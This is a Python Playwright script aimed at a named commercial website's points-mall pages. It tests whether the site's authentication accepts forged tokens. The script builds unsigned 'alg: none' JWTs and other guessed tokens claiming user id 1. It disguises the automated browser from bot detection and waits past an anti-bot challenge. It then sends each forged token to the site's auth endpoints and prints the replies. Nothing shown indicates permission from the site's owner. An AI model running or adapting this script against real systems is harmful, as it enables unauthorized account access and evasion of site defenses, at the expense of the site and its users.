import os, base64, json
from playwright.sync_api import sync_playwright
U=os.environ.get('PROBE_URL','https://m.lbtek.com/points-mall')
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
def b64u(o): return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).decode().rstrip('=')
toks={
 'jwt_none': b64u({"alg":"none","typ":"JWT"})+"."+b64u({"sub":1,"uid":1,"id":1,"exp":9999999999})+ ".",
 'jwt_none2': b64u({"alg":"None","typ":"JWT"})+"."+b64u({"sub":1,"exp":9999999999})+ ".",
 'jwt_hs256': b64u({"alg":"HS256","typ":"JWT"})+"."+b64u({"sub":1,"exp":9999999999})+".AAAA",
 'empty': '',
 'hex32': 'a'*32,
 'hex64': 'a'*64,
 'num1': '1',
 'bearer': 'Bearer 1',
}
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto(U, wait_until='domcontentloaded', timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async (toks) => {
      const out={};
      for(const [n,t] of Object.entries(toks)){
        try{
          const r=await fetch('/api/v1/auth/tokenTtl',{method:'GET',headers:{'lang':'zh-CN','api-token':t}});
          const txt=await r.text(); out['ttl_'+n]=r.status+'|'+(txt.length>150?txt.slice(0,150):txt);
        }catch(e){out['ttl_'+n]='ERR';}
        try{
          const r=await fetch('/api/v1/auth/loginInfo',{method:'GET',headers:{'lang':'zh-CN','api-token':t}});
          const txt=await r.text(); out['info_'+n]=r.status+'|'+(txt.length>200?txt.slice(0,200):txt);
        }catch(e){out['info_'+n]='ERR';}
      }
      return out;
    }""", toks)
    print('===== JWT =====',flush=True)
    for k,v in res.items(): print('%-18s %s'%(k,v),flush=True)
    b.close()
